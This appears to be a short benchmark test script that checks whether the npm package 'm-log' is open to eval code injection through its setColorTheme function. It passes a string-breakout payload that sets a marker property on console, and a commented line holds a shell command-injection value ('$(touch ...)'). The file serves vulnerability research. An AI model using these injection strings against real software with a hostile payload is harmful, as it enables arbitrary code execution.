done = function done(){
    console.log("Done!");
};

//var DUMMY_FILE = './xyzzy';
//var payload = "$(touch " + DUMMY_FILE + ")";

/* for the eval benchmarks, the idea is to inject an assignment to a property of "console", and
   later check whether the property was set */
var payload = 'console[\"my-awesome-prop-23-42\"] = 23;';

function dummySource(val){
    payload += val;
}

dummySource(' ');

var logger = require('m-log');
logger.setColorTheme({c1: ["\"]};" + payload + "//"]});
// logger.setColorTheme("});" + payload + "//");

if (console["my-awesome-prop-23-42"]){
    console.log("payload was delivered");
} else {
    console.log("payload NOT delivered");
}